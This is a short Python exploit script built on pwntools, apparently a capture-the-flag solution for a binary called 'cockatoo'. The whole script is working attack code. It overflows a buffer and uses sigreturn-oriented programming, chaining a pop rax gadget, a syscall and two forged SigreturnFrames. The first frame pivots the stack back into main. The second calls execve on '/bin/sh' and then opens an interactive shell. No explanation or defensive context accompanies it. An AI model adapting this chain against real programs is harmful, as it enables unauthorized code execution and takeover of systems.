from pwn import *
  
exe = './cockatoo'; elf = context.binary = ELF(exe)
c = constants

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdb_script)
    if args.REMOTE:
        return remote("sss",0x1337)
    else:
        return process(elf.path)

exe_rop = ROP(elf,checksec=False)

io = start()

payload = b""
payload += b"\x50"*0xF8+b"/bin/sh\x00"+b"\x17"
payload += p64(exe_rop.find_gadget([ 'pop rax','ret' ])[0])
payload += p64(15)
payload += p64(exe_rop.find_gadget([ 'syscall' ])[0])

frame = SigreturnFrame()

frame.rdi = 0x4048e0
frame.rsp = 0x404900
frame.rip = elf.sym.main

payload += bytes(frame)


io.sendline(payload)

sleep(1)


payload = b""
payload += b"\x50"*0xF8+b"/bin/sh\x00"+b"\x17"
payload += p64(exe_rop.find_gadget([ 'pop rax','ret' ])[0])
payload += p64(15)
payload += p64(exe_rop.find_gadget([ 'syscall' ])[0])

frame = SigreturnFrame()

frame.rax = 59 
frame.rdi = 0x4048e0
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x404900
frame.rip = exe_rop.find_gadget([ 'syscall' ])[0]

payload += bytes(frame)

io.sendline(payload)


io.interactive()